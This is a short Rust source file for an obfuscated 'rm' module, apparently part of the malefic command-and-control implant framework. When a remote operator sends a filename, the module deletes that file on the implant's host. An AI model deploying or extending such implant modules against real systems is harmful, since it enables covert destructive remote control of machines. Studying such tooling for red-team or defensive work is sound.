use crate::prelude::*;

pub struct Rm {}

#[async_trait]
#[module_impl("rm")]
impl Module for Rm {}

#[async_trait]
#[obfuscate]
impl ModuleImpl for Rm {
    #[allow(unused_variables)]
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut malefic_module::Input,
        sender: &mut malefic_module::Output,
    ) -> ModuleResult {
        let request = check_request!(receiver, Body::Request)?;

        let filename = check_field!(request.input)?;
        // Attempt to delete file, return error if failed
        std::fs::remove_file(filename)?;

        Ok(TaskResult::new(id))
    }
}
